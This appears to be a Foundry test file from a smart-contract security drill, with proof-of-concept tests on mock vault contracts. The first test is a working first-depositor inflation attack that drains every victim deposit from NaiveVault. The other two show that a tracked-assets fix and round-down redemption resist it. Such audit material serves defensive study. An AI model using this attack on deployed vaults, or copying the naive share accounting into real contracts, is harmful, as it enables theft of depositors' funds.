// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import {MockToken, NaiveVault, OrderVault} from "../src/drill17_empty_throne.sol";

/**
 * DRILL 17 PoC - THE EMPTY THRONE
 *
 * PoC #1: NaiveVault first-depositor inflation - CRITICAL, proven with exact numbers
 * PoC #2: OrderVault accounting-order "fix" - HONEST NEGATIVE, donation defeated
 * PoC #3: Rounding direction - HONEST NEGATIVE, round-down favors vault, dust reclaimable
 */
contract Drill17PoC is Test {
    MockToken token;
    NaiveVault naive;
    OrderVault order;

    address attacker = address(0xA77AC);
    address victim1 = address(0xBEEF1);
    address victim2 = address(0xBEEF2);

    uint256 constant DONATION = 1_000_000e18;
    uint256 constant V1_DEPOSIT = 500_000e18;
    uint256 constant V2_DEPOSIT = 2_000_000e18;

    function setUp() public {
        token = new MockToken();
        naive = new NaiveVault(address(token));
        order = new OrderVault(address(token));

        token.mint(attacker, DONATION + 1);
        token.mint(victim1, V1_DEPOSIT);
        token.mint(victim2, V2_DEPOSIT);

        vm.prank(attacker);
        token.approve(address(naive), type(uint256).max);
        vm.prank(attacker);
        token.approve(address(order), type(uint256).max);
        vm.prank(victim1);
        token.approve(address(naive), type(uint256).max);
        vm.prank(victim1);
        token.approve(address(order), type(uint256).max);
        vm.prank(victim2);
        token.approve(address(naive), type(uint256).max);
        vm.prank(victim2);
        token.approve(address(order), type(uint256).max);
    }

    // ============================================================
    // PoC #1: NaiveVault first-depositor inflation - CRITICAL
    // ============================================================
    function test_PoC1_NaiveVault_FirstDepositorInflation() public {
        // STEP 1: attacker is the FIRST depositor, deposits 1 wei
        vm.prank(attacker);
        naive.deposit(1);
        assertEq(naive.shares(attacker), 1);
        assertEq(naive.totalShares(), 1);

        // STEP 2: attacker donates 1,000,000e18 directly (bypasses deposit)
        vm.prank(attacker);
        token.transfer(address(naive), DONATION);
        assertEq(token.balanceOf(address(naive)), DONATION + 1);
        assertEq(naive.totalShares(), 1); // unchanged - that's the trap

        // STEP 3: victim1 deposits 500,000e18
        vm.prank(victim1);
        naive.deposit(V1_DEPOSIT);

        // EXACT MATH: newShares = 500_000e18 * 1 / (1_500_000e18 + 1) = 0
        uint256 expectedShares = V1_DEPOSIT * 1 / (DONATION + 1 + V1_DEPOSIT);
        assertEq(expectedShares, 0, "math check: victim gets 0 shares");
        assertEq(naive.shares(victim1), 0, "BUG #1: victim deposited 500k, got ZERO shares");

        // STEP 3b: even a MUCH larger victim2 gets 0 shares
        vm.prank(victim2);
        naive.deposit(V2_DEPOSIT);
        uint256 expectedShares2 = V2_DEPOSIT * naive.totalShares() / token.balanceOf(address(naive));
        assertEq(expectedShares2, 0, "math check: victim2 (2M) also gets 0 shares");
        assertEq(naive.shares(victim2), 0, "BUG #1: EVERY victim gets 0 shares while attacker holds the only share");

        // STEP 4: attacker redeems their 1 share and sweeps EVERYTHING
        uint256 balBefore = token.balanceOf(attacker);
        vm.prank(attacker);
        naive.redeem(1);
        uint256 balAfter = token.balanceOf(attacker);

        // attacker put in: 1 wei (deposit) + DONATION (donation)
        // attacker receives: ALL vault balance = 1 + DONATION + V1 + V2
        uint256 stolen = balAfter - balBefore;
        assertEq(stolen, 1 + DONATION + V1_DEPOSIT + V2_DEPOSIT, "attacker sweeps entire vault");

        // PROFIT = victims' deposits, exactly
        uint256 attackerCost = 1 + DONATION;
        uint256 profit = balAfter - attackerCost;
        assertEq(profit, V1_DEPOSIT + V2_DEPOSIT, "PROFIT = 100% of all victims' deposits");
        assertEq(profit, 2_500_000e18, "exact profit: 2,500,000e18 tokens");

        // victims: total loss, zero recourse
        assertEq(token.balanceOf(victim1), 0);
        assertEq(token.balanceOf(victim2), 0);
        assertEq(token.balanceOf(address(naive)), 0, "vault emptied");

        console.log("[PoC #1] NaiveVault first-depositor inflation: CRITICAL");
        console.log("  attacker profit:", profit, "(= 100% of victims' deposits)");
        console.log("  victim1 loss:  ", V1_DEPOSIT);
        console.log("  victim2 loss:  ", V2_DEPOSIT);
    }

    // ============================================================
    // PoC #2: OrderVault - HONEST NEGATIVE (fix works)
    // ============================================================
    function test_PoC2_OrderVault_DonationDefeated_HonestNegative() public {
        // Same attack sequence on OrderVault
        vm.prank(attacker);
        order.deposit(1);
        assertEq(order.totalShares(), 1);

        // donation - does NOT affect totalAssetsTracked
        vm.prank(attacker);
        token.transfer(address(order), DONATION);
        assertEq(order.totalAssets(), 1, "donation invisible to accounting");

        // victim deposits - shares computed from assetsBefore=1, NOT balanceOf
        vm.prank(victim1);
        order.deposit(V1_DEPOSIT);

        uint256 expectedShares = V1_DEPOSIT * 1 / 1; // amount * totalShares / assetsBefore
        assertEq(order.shares(victim1), expectedShares, "victim gets FULL proportional shares");
        assertGt(order.shares(victim1), 0, "BUG #2 NOT EXPLOITABLE: donation defeated");

        // victim redeems: gets EXACTLY their deposit back - donation NOT captured
        uint256 v1Shares = order.shares(victim1);
        uint256 totalSh = order.totalShares();
        uint256 expectedAssets = v1Shares * order.totalAssets() / totalSh;

        vm.prank(victim1);
        order.redeem(v1Shares);
        assertEq(token.balanceOf(victim1), expectedAssets);
        assertEq(token.balanceOf(victim1), V1_DEPOSIT, "HONEST: victim gets deposit back, no theft");

        // attacker redeems their 1 share
        vm.prank(attacker);
        order.redeem(1);
        assertEq(order.totalShares(), 0, "all shares burned");

        // SIDE EFFECT (honest): donated tokens are now ORPHANED forever
        assertEq(token.balanceOf(address(order)), DONATION, "donation locked in vault, no claim path");

        console.log("[PoC #2] OrderVault: HONEST NEGATIVE - donation theft attack defeated");
        console.log("  victim shares:", v1Shares, "(full proportional)");
        console.log("  victim redeem: ", token.balanceOf(victim1), "(exact deposit back)");
        console.log("  side effect:   ", DONATION, "donated tokens locked (informational)");
    }

    // ============================================================
    // PoC #3: Rounding - HONEST NEGATIVE (round-down favors vault)
    // ============================================================
    function test_PoC3_RoundingDirection_HonestNegative() public {
        // Set up non-trivial ratio: two deposits, sharePrice > 1
        vm.prank(victim1);
        naive.deposit(1000e18);
        vm.prank(victim2);
        naive.deposit(1000e18);
        // totalShares = 1000e18 + (1000e18*1000e18/2000e18) = 1500e18
        assertEq(naive.totalShares(), 1500e18);

        // Donate 1 wei so vault balance is NOT a clean multiple of totalShares
        vm.prank(attacker);
        token.transfer(address(naive), 1);

        uint256 bal = token.balanceOf(address(naive)); // 2000e18 + 1
        uint256 totalSh = naive.totalShares();          // 1500e18

        // redeem 3 shares: assets = 3 * (2000e18+1) / 1500e18
        //   = 6000000000000000000003 / 1500000000000000000000
        //   = 4.000000000000000000002 -> truncates to 4 (round DOWN)
        uint256 before = token.balanceOf(victim1);
        vm.prank(victim1);
        naive.redeem(3);
        uint256 got = token.balanceOf(victim1) - before;

        uint256 exactFloor = 3 * bal / totalSh;
        assertEq(exactFloor, 4, "math check: floor(4.0000...002) = 4");
        assertEq(got, exactFloor, "redeem rounds DOWN (truncation)");
        // the fractional 2 wei stays in the vault -> favors remaining holders

        // Dust check: last redeemer reclaims ALL remaining balance - no locked value
        // NOTE: read shares BEFORE prank - the staticcall would consume the prank
        uint256 v2Shares = naive.shares(victim2);
        uint256 v1SharesLeft = naive.shares(victim1);
        vm.prank(victim2);
        naive.redeem(v2Shares);
        vm.prank(victim1);
        naive.redeem(v1SharesLeft);

        assertEq(token.balanceOf(address(naive)), 0, "HONEST: no dust locked in vault - last redeemer sweeps remainder");

        console.log("[PoC #3] Rounding: HONEST NEGATIVE - round-down favors vault");
        console.log("  redeem(3 shares) paid:", got, "(floor of 4.0000...002)");
        console.log("  final vault balance:  0 (all dust reclaimed by redeemers)");
    }
}
